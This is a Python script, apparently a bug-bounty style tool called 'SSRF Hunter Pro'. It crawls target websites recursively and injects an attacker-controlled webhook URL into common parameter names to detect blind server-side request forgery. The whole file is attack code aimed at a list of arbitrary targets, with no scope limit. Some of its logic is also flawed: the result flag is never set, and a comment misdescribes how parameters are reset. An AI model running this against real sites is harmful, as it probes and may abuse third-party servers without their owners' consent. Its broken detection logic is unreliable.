import requests
import argparse
from urllib.parse import urlparse, urljoin, urlencode, parse_qs
from bs4 import BeautifulSoup
import time

# Common SSRF param names to test
ssrf_params = [
    "url", "uri", "path", "continue", "data", "dest", "destination",
    "redirect", "next", "v", "image", "file", "link", "src", "load",
    "page", "callback", "return", "site", "open"
]

def fetch_links(url, verbose=False):
    """Fetch all links from the given URL for deeper crawling."""
    try:
        if verbose:
            print(f"[*] Crawling links on: {url}")
        resp = requests.get(url, timeout=10)
        if resp.status_code != 200:
            if verbose:
                print(f"[-] Failed to fetch {url} (status {resp.status_code})")
            return []
        soup = BeautifulSoup(resp.text, "html.parser")
        links = []
        for a in soup.find_all("a", href=True):
            href = a['href']
            if href.startswith("http"):
                links.append(href)
            else:
                links.append(urljoin(url, href))
        return list(set(links))
    except Exception as e:
        if verbose:
            print(f"[-] Error fetching links from {url}: {e}")
        return []

def test_ssrf(url, blind_url, verbose=False):
    """Test SSRF by injecting blind URL into common SSRF params."""
    parsed = urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    query = parse_qs(parsed.query)
    
    found_ssrf = False
    for param in ssrf_params:
        # Inject the blind URL as param value
        query[param] = blind_url
        new_query = urlencode(query, doseq=True)
        test_url = f"{base_url}?{new_query}"
        try:
            if verbose:
                print(f"[*] Tested: {test_url}")
            resp = requests.get(test_url, timeout=10, allow_redirects=True)
            if resp.status_code == 200:
                # For blind testing, rely on webhook to confirm real SSRF
                # So just report tested here, actual confirmation is manual
                pass
        except Exception as e:
            if verbose:
                print(f"[-] Request error: {e}")
        # Reset query dict param to original to avoid param pollution
        query.pop(param)
    return found_ssrf

def deep_scan(url, blind_url, visited, verbose=False):
    """Deep crawl and test SSRF on found links."""
    if url in visited:
        return
    visited.add(url)
    
    if verbose:
        print(f"[*] Scanning URL: {url}")
    test_ssrf(url, blind_url, verbose=verbose)
    
    links = fetch_links(url, verbose=verbose)
    for link in links:
        if urlparse(link).netloc == urlparse(url).netloc:
            deep_scan(link, blind_url, visited, verbose=verbose)

def main():
    parser = argparse.ArgumentParser(description="SSRF Hunter Pro")
    parser.add_argument("--list", required=True, help="File containing list of target URLs")
    parser.add_argument("--blind", required=True, help="Your webhook URL for blind SSRF detection")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose output")
    args = parser.parse_args()

    with open(args.list, "r") as f:
        targets = [line.strip() for line in f if line.strip()]
    
    visited = set()
    for target in targets:
        if args.verbose:
            print(f"[+] Starting deep scan on: {target}")
        deep_scan(target, args.blind, visited, verbose=args.verbose)
        time.sleep(1)  # polite delay between targets

    print("\nScan complete.")
    print("Please verify on your webhook.site if any SSRF was triggered.")
    print("Report findings only if your webhook received callbacks.")

if __name__ == "__main__":
    main()
